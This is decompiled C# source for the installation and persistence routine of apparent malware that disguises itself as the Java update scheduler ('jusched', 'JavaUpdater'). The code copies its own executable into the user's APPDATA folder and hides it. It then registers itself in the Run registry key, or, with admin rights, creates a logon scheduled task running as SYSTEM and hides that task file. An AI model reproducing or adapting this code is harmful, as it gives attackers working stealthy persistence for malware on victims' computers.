using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using jusched.My;
using jusched.Security;

namespace jusched;

public class Install
{
	public static Mutex appMutex;

	public static void Mutex_0()
	{
		string name = FingerPrint.Value();
		try
		{
			appMutex = new Mutex(initiallyOwned: true, name, out var createdNew);
			appMutex.ReleaseMutex();
			if (!createdNew)
			{
				Environment.Exit(Environment.ExitCode);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Environment.Exit(0);
			ProjectData.ClearProjectError();
		}
	}

	public static void instacion_0()
	{
		string executablePath = Application.get_ExecutablePath();
		string text = Environment.GetEnvironmentVariable("APPDATA") + "\\" + Configuration.exename;
		PlatformID platform = Environment.OSVersion.Platform;
		if (platform != PlatformID.Win32NT)
		{
			return;
		}
		switch (Environment.OSVersion.Version.Major)
		{
		default:
			try
			{
				global_0.copynhide(executablePath, text);
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Configuration.regname, text);
				break;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				break;
			}
		case 5:
			try
			{
				if (MyProject.User.IsInRole((BuiltInRole)544))
				{
					global_0.copynhide(executablePath, text);
					string path = Environment.GetEnvironmentVariable("windir") + "\\Tasks\\JavaUpdater.job";
					Interaction.Shell("schtasks.exe /Create /SC ONLOGON /TR \"\\\"" + text + "\\\"\" /TN " + Configuration.tksname + " /RU \"NT Authority\\System\"", (AppWinStyle)0, false, -1);
					if (File.Exists(path))
					{
						File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
					}
				}
				else if (MyProject.User.IsInRole((BuiltInRole)545))
				{
					global_0.copynhide(executablePath, text);
					global_0.reg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", Configuration.regname, text);
				}
				break;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				break;
			}
		case 6:
			global_0.copynhide(executablePath, text);
			global_0.reg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", Configuration.regname, text);
			break;
		}
	}
}
